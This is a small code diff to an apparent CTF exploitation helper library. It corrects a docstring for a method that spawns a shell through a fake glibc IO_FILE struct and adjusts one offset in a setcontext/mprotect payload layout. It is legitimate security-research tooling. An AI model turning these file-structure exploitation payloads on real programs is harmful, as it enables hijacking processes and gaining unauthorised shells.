@@ -151,7 +151,7 @@ class IO_FILE_plus_struct(FileStructure):
 
     # only support amd64
     def getshell_by_str_jumps_finish_when_exit(self, _IO_str_jumps_addr:int, system_addr:int, bin_sh_addr:int):
-        """Execute system("/bin/sh) through fake IO_FILE struct, and the version of libc should between 2.24 and 2.29.
+        """Execute system("/bin/sh") through fake IO_FILE struct, and the version of libc should be between 2.24 and 2.29.
 
         Usually, you have hijacked _IO_list_all, and will call _IO_flush_all_lockp by exit or other function.
 
@@ -208,7 +208,7 @@ class IO_FILE_plus_struct(FileStructure):
                 0x20: setcontext_off_addr,
                 0xa0: fp_heap_addr + 0x210,
                 0xa8: mprotect_addr,
-                0x70: 0x6000,
+                0x70: 0x2000,
                 0x68: (fp_heap_addr + 0x110)&~0xfff,
                 0x88: 7,
                 0x100: fp_heap_addr + 0x310,
